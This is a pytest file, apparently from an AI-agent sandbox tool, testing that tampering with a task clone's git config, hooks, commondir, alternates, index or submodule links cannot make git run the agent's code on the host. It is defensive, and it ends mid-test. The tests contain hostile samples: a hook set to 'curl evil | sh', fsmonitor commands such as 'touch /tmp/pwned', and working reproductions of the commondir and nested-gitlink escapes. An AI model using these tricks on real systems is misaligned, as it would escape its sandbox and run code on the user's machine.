import hashlib
import json
import os
import shutil
import socket
import stat
import subprocess
import threading
from pathlib import Path

import pytest
from conftest import make_repo

from vivibox import repo as r


def git(path: Path, *args: str) -> str:
    return subprocess.run(["git", *args], cwd=path, check=True, capture_output=True, text=True).stdout.strip()


@pytest.fixture
def cloned(tmp_path):
    source = make_repo(tmp_path / "source")
    git(source, "remote", "add", "origin", "https://github.com/example/demo.git")
    # Settings in your own repo that must not reach the task clone.
    git(source, "config", "core.fsmonitor", "echo from-source")
    git(source, "config", "core.hooksPath", ".husky/_")
    meta = tmp_path / "task" / ".task"
    meta.mkdir(parents=True)
    repo = tmp_path / "task" / "repo"
    base = r.prepare(source, repo, "demo-1", meta)
    return source, repo, meta, base


def test_clone_is_on_task_branch_from_source_head(cloned):
    source, repo, _, base = cloned
    assert git(repo, "branch", "--show-current") == "vivibox/demo-1"
    assert base == git(source, "rev-parse", "HEAD")
    assert git(repo, "remote", "get-url", "origin") == "https://github.com/example/demo.git"


def test_clone_does_not_share_objects_with_source(cloned):
    _, repo, _, _ = cloned
    objects = [p for p in (repo / ".git" / "objects").rglob("*") if p.is_file()]
    assert objects and all(p.stat().st_nlink == 1 for p in objects)


def test_config_is_reduced_to_allowlist_and_hooks_are_empty(cloned):
    _, repo, _, _ = cloned
    keys = {line.split("=", 1)[0] for line in git(repo, "config", "--local", "--list").splitlines()}
    assert keys <= set(r.CONFIG_ALLOWLIST)
    assert "core.fsmonitor" not in keys and "core.hookspath" not in keys
    assert list((repo / ".git" / "hooks").iterdir()) == []


def test_commits_are_authored_as_you(cloned):
    _, _, meta, _ = cloned
    text = (meta / "gitconfig").read_text()
    assert "name = Test User" in text and "email = test@example.com" in text
    assert "hooksPath" not in text


def test_protection_detects_config_or_hook_changes(cloned):
    _, repo, meta, _ = cloned
    r.check_protection(repo, meta)
    (repo / ".git" / "hooks" / "post-checkout").write_text("#!/bin/sh\n")
    with pytest.raises(r.RepoError, match="changed"):
        r.check_protection(repo, meta)
    (repo / ".git" / "hooks" / "post-checkout").unlink()
    git(repo, "config", "core.fsmonitor", "touch /tmp/pwned")
    with pytest.raises(r.RepoError, match="changed"):
        r.check_protection(repo, meta)


def test_fetch_brings_task_branch_into_source(cloned):
    source, repo, meta, _ = cloned
    (repo / "feature.txt").write_text("x\n")
    git(repo, "add", ".")
    git(repo, "-c", "user.name=A", "-c", "user.email=a@b", "commit", "-q", "-m", "Add feature")
    commit = r.fetch_to(source, repo, meta, "demo-1")
    assert commit == git(repo, "rev-parse", "HEAD")
    assert git(source, "log", "-1", "--format=%s", "vivibox/demo-1") == "Add feature"
    assert git(source, "branch", "--show-current") == "main", "your checkout is not touched"


def test_fetch_refuses_tampered_clone(cloned):
    source, repo, meta, _ = cloned
    git(repo, "config", "core.fsmonitor", "touch /tmp/pwned")
    with pytest.raises(r.RepoError):
        r.fetch_to(source, repo, meta, "demo-1")
    assert "vivibox/demo-1" not in git(source, "branch", "--list")


def test_agent_mounts_protect_git_files(cloned):
    _, repo, meta, _ = cloned
    mounts = {m.target: m for m in r.agent_mounts(repo, meta)}
    assert not mounts[str(repo / ".git")].read_only, "separate .git mount: cannot be renamed or replaced"
    assert mounts[str(repo / ".git" / "config")].read_only
    assert mounts[str(repo / ".git" / "hooks")].read_only
    assert mounts["/config/.gitconfig"].read_only


def test_submodule_git_dirs_are_protected(tmp_path, monkeypatch):
    # Submodules from local paths are blocked by default since git 2.38.
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "protocol.file.allow")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "always")
    sub = make_repo(tmp_path / "lib")
    source = make_repo(tmp_path / "source")
    git(source, "submodule", "add", "-q", str(sub), "lib")
    git(source, "commit", "-q", "-m", "Add submodule")
    meta = tmp_path / "meta"
    meta.mkdir()
    repo = tmp_path / "repo"
    r.prepare(source, repo, "demo-1", meta)
    module = repo / ".git" / "modules" / "lib"
    assert module in r.git_dirs(repo)
    assert f"{module}/config" in {m.target for m in r.agent_mounts(repo, meta) if m.read_only}
    assert json.loads((meta / r.PROTECTION_RECORD).read_text())[".git/modules/lib/config"]


def test_lfs_is_refused(tmp_path):
    source = make_repo(tmp_path / "source")
    (source / ".gitattributes").write_text("*.bin filter=lfs diff=lfs merge=lfs -text\n")
    with pytest.raises(r.RepoError, match="LFS"):
        r.prepare(source, tmp_path / "repo", "demo-1", tmp_path)


def test_what_tools_in_the_pod_write_is_not_the_agent_s_to_commit(cloned):
    """Serena keeps its project file and caches in .serena/ of the repository it reads."""
    repo = cloned[1]
    (repo / ".serena").mkdir()
    (repo / ".serena" / "project.yml").write_text("name: demo\n")
    assert git(repo, "status", "--porcelain") == ""


# --- What git on the host follows from the clone's git dirs -------------------------------------
# git reads more than config and hooks from a git dir: commondir names another git dir (its config,
# its hooks), alternates name other object stores, a submodule's .git file names its git dir, and
# HEAD may be a link. The agent writes all of them; vivibox runs no git in the clone unless every
# one is as prepare left it.


def agent_git(path: Path, *args: str) -> str:
    """git as the agent runs it in its pod, simulated on the host."""
    return git(path, "-c", "user.name=A", "-c", "user.email=a@b", "-c", "gc.autoDetach=false", *args)


@pytest.fixture
def with_lib(tmp_path, monkeypatch):
    """A task's clone with a submodule, as prepare leaves it."""
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "protocol.file.allow")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "always")
    lib = make_repo(tmp_path / "lib")
    source = make_repo(tmp_path / "source")
    git(source, "submodule", "add", "-q", str(lib), "lib")
    git(source, "commit", "-q", "-m", "Add submodule")
    meta = tmp_path / "task" / ".task"
    meta.mkdir(parents=True)
    repo = tmp_path / "task" / "repo"
    r.prepare(source, repo, "demo-1", meta)
    return repo, meta


def refused(repo: Path, meta: Path) -> str:
    with pytest.raises(r.RepoError, match="changed") as e:
        r.check_protection(repo, meta)
    return str(e.value)


def marker_script(tmp_path: Path, marker: Path) -> Path:
    script = tmp_path / "agent-program"
    script.write_text(f"#!/bin/sh\ntouch {marker}\nexit 1\n")
    script.chmod(0o755)
    return script


def test_a_commondir_to_the_agents_config_runs_nothing_on_the_host(cloned, tmp_path, monkeypatch):
    """The confirmed attack: git 2.43 follows commondir to another config, reads core.hooksPath
    and core.fsmonitor there, and runs what they say on the host."""
    _, repo, meta, _ = cloned
    marker = tmp_path / "ran-on-the-host"
    script = marker_script(tmp_path, marker)
    hooks = tmp_path / "agent-hooks"
    hooks.mkdir()
    for name in ("post-index-change", "reference-transaction", "post-checkout"):
        (hooks / name).symlink_to(script)
    common = repo / "elsewhere"  # the agent writes only in the clone
    shutil.copytree(repo / ".git", common, ignore=shutil.ignore_patterns("config", "hooks"))
    (common / "config").write_text(
        f"[core]\n\trepositoryformatversion = 0\n\thooksPath = {hooks}\n\tfsmonitor = {script}\n"
    )
    (repo / ".git" / "commondir").write_text("../elsewhere\n")
    subprocess.run(["git", "status"], cwd=repo, capture_output=True)
    assert marker.exists(), "the attack is real: plain git on the host runs the agent's program"
    marker.unlink()

    ran = []
    real = r._bounded
    monkeypatch.setattr(r, "_bounded", lambda command, *a: ran.append(command) or real(command, *a))
    assert ".git/commondir" in refused(repo, meta)
    with pytest.raises(r.RepoError, match="changed"):
        r.in_clone(repo, "status")
    assert ran == [], "no git ran on the host"
    assert not marker.exists()


def _link(path: Path, target: str) -> None:
    path.unlink()
    path.symlink_to(target)


# What the agent writes in a git dir to send git elsewhere; each is refused, at .git and in a submodule's.
CHANGES = {
    "commondir": lambda d: (d / "commondir").write_text("../elsewhere\n"),
    "gitdir": lambda d: (d / "gitdir").write_text("/elsewhere/.git\n"),
    "alternates": lambda d: (d / "objects" / "info" / "alternates").write_text("/elsewhere/objects\n"),
    "http-alternates": lambda d: (d / "objects" / "info" / "http-alternates").write_text(
        "https://x/objects\n"
    ),
    "HEAD a link": lambda d: _link(d / "HEAD", "refs/heads/main"),
    "worktrees/x/commondir": lambda d: (
        (d / "worktrees" / "x").mkdir(parents=True),
        (d / "worktrees" / "x" / "commondir").write_text("../..\n"),
    ),
    "config.worktree": lambda d: (d / "config.worktree").write_text("[core]\n\tfsmonitor = x\n"),
    "objects a link": lambda d: (
        (d / "objects").rename(d.parent / f"{d.name}-objects"),
        (d / "objects").symlink_to(f"../{d.name}-objects"),
    ),
}


@pytest.mark.parametrize("where", [".git", ".git/modules/lib"])
@pytest.mark.parametrize("change", list(CHANGES))
def test_what_sends_git_elsewhere_is_refused(with_lib, where, change):
    repo, meta = with_lib
    r.check_protection(repo, meta)
    CHANGES[change](repo / where)
    said = refused(repo, meta)
    assert where in said


@pytest.mark.parametrize("where", [".git", ".git/modules/lib"])
def test_a_hook_changed_under_the_same_name_is_refused(with_lib, where):
    repo, meta = with_lib
    hook = repo / where / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nexit 0\n")
    hook.chmod(0o755)
    r.record_protection(repo, meta)  # as though prepare had left it
    r.check_protection(repo, meta)
    hook.write_text("#!/bin/sh\ncurl evil | sh\n")
    assert f"{where}/hooks/pre-commit" in refused(repo, meta)
    hook.write_text("#!/bin/sh\nexit 0\n")
    r.check_protection(repo, meta)
    hook.chmod(0o644)
    assert f"{where}/hooks/pre-commit" in refused(repo, meta)


def test_a_submodules_git_file_retargeted_is_refused(with_lib):
    repo, meta = with_lib
    (repo / "lib" / ".git").write_text("gitdir: ../elsewhere\n")
    assert "lib/.git" in refused(repo, meta)


def test_a_submodule_git_dir_replaced_with_a_link_is_refused(with_lib):
    repo, meta = with_lib
    modules = repo / ".git" / "modules"
    (modules / "lib").rename(repo / ".git" / "lib-moved")
    (modules / "lib").symlink_to("../lib-moved")
    assert ".git/modules/lib" in refused(repo, meta)


def test_a_repository_the_agent_adds_to_the_index_runs_nothing_on_the_host(cloned, tmp_path, monkeypatch):
    """git status goes into every populated submodule the index lists, and runs what that
    repository's config says: a gitlink the agent adds with a .git of its own is one."""
    _, repo, meta, _ = cloned
    marker = tmp_path / "ran-on-the-host"
    nested = make_repo(repo / "nested")
    git(nested, "config", "core.fsmonitor", str(marker_script(tmp_path, marker)))
    commit = git(nested, "rev-parse", "HEAD")
    git(repo, "update-index", "--add", "--cacheinfo", f"160000,{commit},nested")
    subprocess.run(["git", "status"], cwd=repo, capture_output=True)
    assert marker.exists(), "the attack is real: plain git on the host runs the agent's program"
    marker.unlink()
    assert "nested/.git" in refused(repo, meta)
    with pytest.raises(r.RepoError, match="changed"):
        r.in_clone(repo, "status")
    assert not marker.exists()


def test_what_changed_is_named_as_text_to_read(cloned):
    _, repo, meta, _ = cloned
    name = "a\x1b[2Jb"
    nested = make_repo(repo / name)
    git(repo, "update-index", "--add", "--cacheinfo", f"160000,{git(nested, 'rev-parse', 'HEAD')},{name}")
    said = refused(repo, meta)
    assert "a‹U+001B›[2Jb/.git" in said and "\x1b" not in said
    assert str(repo) not in said, "no path to paste into a shell"


# --- Never blocking on what the agent put where git reads ----------------------------------------

PLACES = [".git/modules/lib/config", ".git/commondir", ".git/HEAD"]


def in_time(call, seconds: float = 10):
    done = []

    def run():
        try:
            done.append(call())
        except Exception as e:
            done.append(e)

    worker = threading.Thread(target=run, daemon=True)
    worker.start()
    worker.join(timeout=seconds)
    assert done, "the check hung"
    return done[0]


@pytest.fixture
def opened(monkeypatch):
    """What was opened that is not a plain file or a folder: the kinds the check never opens."""
    found = []
    real = os.open

    def spy(path, flags, *args, **kwargs):
        fd = real(path, flags, *args, **kwargs)
        mode = os.fstat(fd).st_mode
        if not (stat.S_ISREG(mode) or stat.S_ISDIR(mode)):
            found.append(path)
        return fd

    monkeypatch.setattr(os, "open", spy)
    return found


@pytest.mark.parametrize("place", PLACES)
def test_a_fifo_where_git_reads_is_refused_without_reading_it(with_lib, place, opened):
    repo, meta = with_lib
    (repo / place).unlink(missing_ok=True)
    os.mkfifo(repo / place)
    said = in_time(lambda: r.check_protection(repo, meta))
    assert isinstance(said, r.RepoError) and "changed" in str(said), said
    assert f"{place} is a named pipe (FIFO)" in str(said)
    assert opened == []


@pytest.mark.parametrize("place", PLACES)
def test_a_socket_where_git_reads_is_refused_without_opening_it(with_lib, place, opened, monkeypatch):
    repo, meta = with_lib
    path = repo / place
    path.unlink(missing_ok=True)
    monkeypatch.chdir(path.parent)  # a socket's path is short; the test's folder is not
    server = socket.socket(socket.AF_UNIX)
    server.bind(path.name)
    try:
        said = in_time(lambda: r.check_protection(repo, meta))
    finally:
        server.close()
    assert isinstance(said, r.RepoError) and f"{place} is a socket" in str(said), said
    assert opened == []


@pytest.mark.parametrize("place", PLACES)
def test_a_device_where_git_reads_is_refused_without_opening_it(with_lib, place, opened, monkeypatch):
    """A device cannot be made without root: lstat says one is there, as it would."""
    repo, meta = with_lib
    path = repo / place
    real = os.lstat

    def lstat(name, *, dir_fd=None):
        if (
            dir_fd is not None
            and name == path.name
            and os.path.samefile(f"/proc/self/fd/{dir_fd}", path.parent)
        ):
            return real("/dev/null")
        return real(name, dir_fd=dir_fd) if dir_fd is not None else real(name)

    monkeypatch.setattr(os, "lstat", lstat)
    said = in_time(lambda: r.check_protection(repo, meta))
    assert isinstance(said, r.RepoError) and f"{place} is a device" in str(said), said
    assert opened == []


# --- Normal git work is no change -----------------------------------------------------------------


def test_the_agents_normal_git_work_is_no_change(with_lib):
    """What git writes in a git dir in normal use (ORIG_HEAD, FETCH_HEAD, logs/, index,
    packed-refs, objects/pack, the commit-graph) is not what sends it elsewhere."""
    repo, meta = with_lib
    for where in (repo / "lib", repo):
        for n in range(3):
            (where / f"work-{n}.txt").write_text(f"{n}\n")
            agent_git(where, "add", ".")
            agent_git(where, "commit", "-q", "-m", f"Work {n}")
        agent_git(where, "switch", "-q", "-c", "topic")
        (where / "topic.txt").write_text("t\n")
        agent_git(where, "add", ".")
        agent_git(where, "commit", "-q", "-m", "Topic")
        agent_git(where, "reset", "-q", "--soft", "HEAD~1")
        agent_git(where, "commit", "-q", "-m", "Topic again")
        agent_git(where, "fetch", "-q", ".", "topic")
        agent_git(where, "-c", "gc.auto=1", "-c", "gc.autoPackLimit=1", "gc", "--auto", "--quiet")
        agent_git(where, "gc", "--quiet")
        agent_git(where, "commit-graph", "write", "--reachable")
        agent_git(where, "repack", "-d", "-q")
        agent_git(where, "pack-refs", "--all")
        agent_git(where, "maintenance", "run", "--quiet")
        agent_git(where, "status", "--porcelain")
    r.check_protection(repo, meta)
    assert r.in_clone(repo, "rev-parse", "HEAD").returncode == 0


# --- Every host git call on the clone goes through the check --------------------------------------


def test_git_on_the_clone_runs_only_after_the_check(cloned, monkeypatch):
    _, repo, meta, _ = cloned
    assert r.in_clone(repo, "rev-parse", "HEAD").returncode == 0
    ran = []
    real = r._bounded
    monkeypatch.setattr(r, "_bounded", lambda command, *a: ran.append(command) or real(command, *a))
    (repo / ".git" / "objects" / "info" / "alternates").write_text("/elsewhere/objects\n")
    with pytest.raises(r.RepoError, match="changed"):
        r.in_clone(repo, "rev-parse", "HEAD")
    assert ran == []


def test_your_checkout_is_not_a_clone_to_check(cloned):
    source = cloned[0]
    assert r.in_clone(source, "rev-parse", "HEAD").returncode == 0


def test_a_clone_without_its_record_is_refused(cloned):
    _, repo, meta, _ = cloned
    (meta / r.PROTECTION_RECORD).unlink()
    with pytest.raises(r.RepoError, match="record"):
        r.in_clone(repo, "rev-parse", "HEAD")


def test_the_risky_files_scan_asks_no_git_of_a_changed_clone(cloned, monkeypatch):
    from vivibox import risky

    _, repo, meta, _ = cloned
    (repo / ".git" / "commondir").write_text("../elsewhere\n")
    ran = []
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: ran.append(a) or pytest.fail("git ran"))
    real = r._bounded
    monkeypatch.setattr(r, "_bounded", lambda command, *a: ran.append(command) or real(command, *a))
    with pytest.raises(r.RepoError, match="changed"):
        r.check_protection(repo, meta)
    # What git cannot say for a refused clone is answered as when it does not answer: nothing left
    # out of the scan, and a folder scanned.
    assert risky.ignored(repo) == set()
    assert risky.untracked(repo, repo / "node_modules") is False
    assert not r._committed(repo, "README.md")
    assert ran == []


def test_the_containers_copy_of_a_changed_clone_is_not_made(cloned, tmp_path):
    from vivibox.pod import Pod

    _, repo, meta, _ = cloned
    calls = []

    def docker(cmd, timeout=None):
        calls.append(list(cmd))
        return subprocess.CompletedProcess(cmd, 0, "", "")

    pod = Pod(
        "demo-1", repo, "img", gate_dir=tmp_path / "gate", review_dir=tmp_path / "review", runner=docker
    )
    pod.review_fresh()
    (repo / ".git" / "commondir").write_text("../elsewhere\n")
    with pytest.raises(r.RepoError, match="changed"):
        pod.review_start([], {})
    with pytest.raises(r.RepoError, match="changed"):
        pod.gate_up()
    assert not [c for c in calls if "clone" in c]


# --- A task recorded by an earlier vivibox ---------------------------------------------------------


def old_record(repo: Path) -> dict[str, str]:
    """The record as vivibox wrote it before: each git dir's config and its hooks' names."""
    result = {}
    modules = repo / ".git" / "modules"
    for d in [
        repo / ".git",
        *sorted(p.parent for p in modules.rglob("config") if (p.parent / "HEAD").exists()),
    ]:
        rel = d.relative_to(repo).as_posix()
        result[f"{rel}/config"] = hashlib.sha256((d / "config").read_bytes()).hexdigest()
        result[f"{rel}/hooks"] = ",".join(sorted(p.name for p in (d / "hooks").iterdir()))
    return result


@pytest.fixture
def recorded_before(with_lib):
    """A task whose clone an earlier vivibox made: no empty alternates, and the old record."""
    repo, meta = with_lib
    for d in (repo / ".git", repo / ".git" / "modules" / "lib"):
        for name in ("alternates", "http-alternates"):
            (d / "objects" / "info" / name).unlink(missing_ok=True)
    (meta / r.PROTECTION_RECORD).write_text(json.dumps(old_record(repo)))
    return repo, meta


def test_a_task_recorded_before_is_recorded_again_when_nothing_else_was_written(recorded_before):
    repo, meta = recorded_before
    r.check_protection(repo, meta)
    record = json.loads((meta / r.PROTECTION_RECORD).read_text())
    assert record["format"] == 2 and "lib/.git" in record["gitfiles"]
    (repo / ".git" / "commondir").write_text("../elsewhere\n")
    assert ".git/commondir" in refused(repo, meta)


BEFORE = {
    "commondir": lambda repo: (repo / ".git" / "commondir").write_text("../elsewhere\n"),
    "submodule's alternates": lambda repo: (
        repo / ".git" / "modules" / "lib" / "objects" / "info" / "alternates"
    ).write_text("/elsewhere/objects\n"),
    "config": lambda repo: git(repo, "config", "core.fsmonitor", "touch /tmp/x"),
    "git file": lambda repo: (repo / "lib" / ".git").write_text("gitdir: ../elsewhere\n"),
    "new gitlink": lambda repo: (
        make_repo(repo / "nested"),
        git(
            repo,
            "update-index",
            "--add",
            "--cacheinfo",
            f"160000,{git(repo / 'nested', 'rev-parse', 'HEAD')},nested",
        ),
    ),  # fmt: skip
}


@pytest.mark.parametrize("change", list(BEFORE))
def test_a_task_recorded_before_with_anything_else_written_is_refused(recorded_before, change):
    repo, meta = recorded_before
    old = (meta / r.PROTECTION_RECORD).read_text()
    BEFORE[change](repo)
    said = refused(repo, meta)
    assert "earlier vivibox" in said, "says why a task that ran before is stopped now"
    assert (meta / r.PROTECTION_RECORD).read_text() == old, "nothing recorded over it"


# --- What the agent's pod mounts -------------------------------------------------------------------


def test_alternates_are_read_only_for_the_agent(with_lib):
    repo, meta = with_lib
    mounts = {m.target: m for m in r.agent_mounts(repo, meta)}
    for d in (".git", ".git/modules/lib"):
        for name in ("alternates", "http-alternates"):
            path = repo / d / "objects" / "info" / name
            assert path.is_file() and path.read_bytes() == b"", (
                "a bind mount needs the file; empty is harmless"
            )
            assert mounts[str(path)].read_only
        # Mounted on themselves: a folder that holds a mount could otherwise be renamed away with it.
        for folder in ("objects", "objects/info"):
            assert not mounts[str(repo / d / folder)].read_only
        assert mounts[str(repo / d / "config")].read_only and mounts[str(repo / d / "hooks")].read_only
    assert not mounts[str(repo / ".git" / "modules")].read_only
    assert not mounts[str(repo / ".git" / "modules" / "lib")].read_only


def test_a_link_the_agent_made_is_never_mounted(with_lib, tmp_path):
    """Docker mounts what a link leads to: a link where a git file was is the host's file."""
    repo, meta = with_lib
    secret = tmp_path / "your-secret"
    secret.write_text("key\n")
    planted = repo / ".git" / "modules" / "x"
    planted.mkdir()
    (planted / "HEAD").write_text("ref: refs/heads/main\n")
    (planted / "config").symlink_to(secret)
    (planted / "hooks").symlink_to(tmp_path)
    alternates = repo / ".git" / "modules" / "lib" / "objects" / "info" / "alternates"
    alternates.unlink()
    alternates.symlink_to(secret)
    for m in r.agent_mounts(repo, meta):
        assert not Path(m.source).is_symlink(), m
        assert Path(m.source).resolve() != secret and Path(m.source).resolve() != tmp_path, m


@pytest.mark.parametrize("version", ["2", "3", "4"])
@pytest.mark.parametrize("object_format", ["sha1", "sha256"])
def test_the_index_is_read_as_git_reads_it(tmp_path, version, object_format):
    """vivibox reads the submodules an index lists without running git there."""
    from vivibox import protection

    repo = tmp_path / "r"
    subprocess.run(["git", "init", "-q", f"--object-format={object_format}", str(repo)], check=True)
    commit = git(repo, "-c", "user.name=A", "-c", "user.email=a@b", "commit-tree", "-m", "x",
                 git(repo, "write-tree"))  # fmt: skip
    names = [f"dir{n % 7}/sub-{n:03d}/file-{'x' * (n % 13)}.txt" for n in range(300)]
    for name in names:
        (repo / name).parent.mkdir(parents=True, exist_ok=True)
        (repo / name).write_text(name)
    git(repo, "add", ".")
    links = ["dir1/a-link", "dir3/sub-010/ünïcode link", "z"]
    for link in links:
        git(repo, "update-index", "--add", "--cacheinfo", f"160000,{commit},{link}")
    (repo / "later.txt").write_text("x")
    git(repo, "add", "-N", "later.txt")  # an extended flag: version 3 and up
    git(repo, "update-index", "--index-version", version)
    listed = protection.gitlinks(
        (repo / ".git" / "index").read_bytes(), 32 if object_format == "sha256" else 20
    )
    assert listed == sorted(links)


def test_an_index_split_in_two_is_refused(cloned):
    _, repo, meta, _ = cloned
    git(repo, "update-index", "--split-index")
    assert ".git/index is an index vivibox cannot read" in refused(repo, meta)


def test_vivibox_never_rewrites_the_clones_index(cloned, monkeypatch):
    """git status writes the index it refreshed, in the form your own settings ask for (a split
    index, core.splitIndex in your ~/.gitconfig), which the next check could not read."""
    _, repo, meta, _ = cloned
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "core.splitIndex")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "true")
    before = (repo / ".git" / "index").read_bytes()
    os.utime(repo / "README.md", (1, 1))  # stale in the index: status would refresh it
    r.in_clone(repo, "status", "--porcelain")
    assert (repo / ".git" / "index").read_bytes() == before
    r.check_protection(repo, meta)


def test_an_index_entry_that_leaves_the_clone_is_refused(cloned):
    """git never writes a name with .. in an index, so one there is the agent's; vivibox does not
    follow it out of the clone to see whether a repository is there."""
    _, repo, meta, _ = cloned
    commit = git(repo, "rev-parse", "HEAD")
    git(repo, "update-index", "--add", "--cacheinfo", f"160000,{commit},zz")
    index = repo / ".git" / "index"
    index.write_bytes(index.read_bytes().replace(b"zz\0", b"..\0"))
    assert "../.git was added" in refused(repo, meta), "not looked up outside the clone"


def test_a_record_vivibox_cannot_read_runs_no_git(cloned, monkeypatch):
    _, repo, meta, _ = cloned
    (meta / r.PROTECTION_RECORD).write_text("{")
    ran = []
    monkeypatch.setattr(r, "_bounded", lambda command, *a: ran.append(command))
    with pytest.raises(r.RepoError, match="could not check the task's clone"):
        r.in_clone(repo, "status")
    assert ran == []


# --- An index the agent wrote that vivibox cannot read is a refusal, never a crash ---------------


def _index_of(repo: Path, version: str) -> bytes:
    git(repo, "update-index", "--index-version", version)
    return (repo / ".git" / "index").read_bytes()


def broken_indexes(repo: Path) -> list[bytes]:
    """A truncated entry, a real version-4 index cut short in its entries, and seeded fuzz: each
    says it holds more entries than its bytes can."""
    import random
    import struct

    v4 = _index_of(repo, "4")
    found = [b"DIRC" + struct.pack(">II", 4, 1) + b"\0" * 62, v4[:40], v4[: len(v4) // 2]]
    rng = random.Random(20261002)
    for _ in range(40):
        version = rng.choice([2, 3, 4])
        count = rng.randint(4, 10**6)
        found.append(b"DIRC" + struct.pack(">II", version, count) + rng.randbytes(rng.randint(0, 200)))
    return found


def test_an_index_vivibox_cannot_read_is_a_refusal(cloned):
    _, repo, meta, _ = cloned
    git(repo, "update-index", "--add", "--cacheinfo", f"160000,{git(repo, 'rev-parse', 'HEAD')},zz")
    for n, data in enumerate(broken_indexes(repo)):
        (repo / ".git" / "index").write_bytes(data)
        try:
            r.check_protection(repo, meta)
        except r.RepoError as e:
            assert ".git/index is an index vivibox cannot read" in str(e), (n, e)
        else:
            pytest.fail(f"index {n} passed: {data[:24]!r}")


def test_the_risky_scan_of_a_clone_with_such_an_index_answers_as_when_git_cannot_say(cloned):
    from vivibox import risky

    _, repo, meta, _ = cloned
    (repo / ".git" / "index").write_bytes(broken_indexes(repo)[0])
    assert risky.ignored(repo) == set()
    assert risky.untracked(repo, repo / "node_modules") is False


def test_a_change_while_a_task_recorded_before_is_recorded_again_is_not_recorded(
    recorded_before, monkeypatch
):
    """The record written is what was compared, never a later read of the clone."""
    from vivibox import protection

    repo, meta = recorded_before
    real = protection.differences
    changed = []

    def then_the_agent_writes(*args):
        found = real(*args)
        if not changed:
            changed.append(True)
            (repo / ".git" / "commondir").write_text("../elsewhere\n")
        return found

    monkeypatch.setattr(protection, "differences", then_the_agent_writes)
    with pytest.raises(r.RepoError, match="changed"):
        r.check_protection(repo, meta)
    record = json.loads((meta / r.PROTECTION_RECORD).read_text())
    assert record.get(".git/commondir", protection.ABSENT) == protection.ABSENT


# --- Reading an index takes time in proportion to it, whatever the agent wrote -------------------


def _v4_index_with_varint(run: int) -> bytes:
    """A version-4 index of one entry whose name's prefix length is a run of continuation bytes."""
    import struct

    entry = b"\0" * 24 + struct.pack(">I", 0o100644) + b"\0" * 12 + b"\0" * 20 + struct.pack(">H", 1)
    return b"DIRC" + struct.pack(">II", 4, 1) + entry + b"\xff" * run + b"\x00" + b"a\0" + b"\0" * 20


def timed(call, seconds: float):
    """call's result or error, and how long it took; a failure past seconds, never a hang."""
    import time

    began = time.monotonic()
    said = in_time(call, seconds)
    return said, time.monotonic() - began


@pytest.mark.parametrize("run", [240_000, 1 << 20])
def test_a_long_varint_in_the_index_is_refused_at_once(cloned, run):
    _, repo, meta, _ = cloned
    (repo / ".git" / "index").write_bytes(_v4_index_with_varint(run))
    said, took = timed(lambda: r.check_protection(repo, meta), 10)
    assert isinstance(said, r.RepoError) and ".git/index is an index vivibox cannot read" in str(said), said
    assert took < 1, f"{took:.1f} s"


@pytest.mark.parametrize("version", ["2", "4"])
def test_a_large_index_of_a_real_repository_is_read_in_time(cloned, version):
    """100,000 files, more than most repositories: read in well under a second, and passed."""
    _, repo, meta, _ = cloned
    blob = git(repo, "hash-object", "-w", "--stdin")
    lines = "".join(f"100644 {blob}\tsrc/module-{n % 300}/pkg/sub/File{n}.java\n" for n in range(100_000))
    subprocess.run(["git", "update-index", "--index-info"], cwd=repo, input=lines, text=True, check=True)
    git(repo, "update-index", "--index-version", version)
    said, took = timed(lambda: r.check_protection(repo, meta), 10)
    assert said is None, said
    assert took < 1, f"{took:.1f} s"


def test_an_index_past_the_limit_is_refused_without_being_read(cloned, monkeypatch):
    from vivibox import protection

    _, repo, meta, _ = cloned
    index = repo / ".git" / "index"
    with index.open("r+b") as f:  # sparse: no disk for the test
        f.truncate(protection.INDEX_LIMIT + 1)
    read = []
    real = os.read

    def counted(fd, n):
        chunk = real(fd, n)
        read.append(len(chunk))
        return chunk

    monkeypatch.setattr(os, "read", counted)
    said, took = timed(lambda: r.check_protection(repo, meta), 10)
    assert isinstance(said, r.RepoError), said
    assert f".git/index is larger than {protection.INDEX_LIMIT >> 20} MiB" in str(said)
    assert protection.INDEX_LIMIT <= 128 << 20, "a limit a real repository's index stays far under"
    assert sum(read) < 1 << 20, "not read"


def test_an_index_refused_is_not_read_again_until_it_changes(cloned, monkeypatch):
    from vivibox import protection

    _, repo, meta, _ = cloned
    (repo / ".git" / "index").write_bytes(_v4_index_with_varint(100))
    parsed = []
    real = protection.gitlinks
    monkeypatch.setattr(protection, "gitlinks", lambda *a: parsed.append(1) or real(*a))
    for _ in range(3):
        with pytest.raises(r.RepoError, match="an index vivibox cannot read"):
            r.check_protection(repo, meta)
    assert len(parsed) == 1
    (repo / ".git" / "index").write_bytes(_v4_index_with_varint(101))
    with pytest.raises(r.RepoError, match="an index vivibox cannot read"):
        r.check_protection(repo, meta)
    assert len(parsed) == 2


def test_an_index_of_endless_extensions_is_refused_at_once(cloned):
    """Extensions are walked by their sizes: one of size 0 every 8 bytes would make a walk of 128
    MiB, and the agent can make every check walk it again (chmod changes the index's ctime)."""
    import struct

    from vivibox import protection

    _, repo, meta, _ = cloned
    index = repo / ".git" / "index"
    with index.open("wb") as f:  # no entries, then zeros to the limit: sparse, no disk for the test
        f.write(b"DIRC" + struct.pack(">II", 2, 0))
        f.truncate(protection.INDEX_LIMIT)
    said, took = timed(lambda: r.check_protection(repo, meta), 10)
    assert isinstance(said, r.RepoError), said
    assert f".git/index holds more than {protection.MAX_EXTENSIONS} extensions" in str(said)
    assert took < 0.1, f"{took:.2f} s"


def test_an_index_of_too_many_submodules_says_so(cloned):
    import struct

    from vivibox import protection

    _, repo, meta, _ = cloned
    link = b"\0" * 24 + struct.pack(">I", 0o160000) + b"\0" * 32 + struct.pack(">H", 1)
    count = protection.MAX_GITLINKS + 1
    # Each name strips the one before whole (a version-4 prefix length), so no name grows.
    entries = b"".join(
        link + bytes([len(f"m{n - 1}") if n else 0]) + f"m{n}".encode() + b"\0" for n in range(count)
    )
    (repo / ".git" / "index").write_bytes(b"DIRC" + struct.pack(">II", 4, count) + entries + b"\0" * 20)
    said = refused(repo, meta)
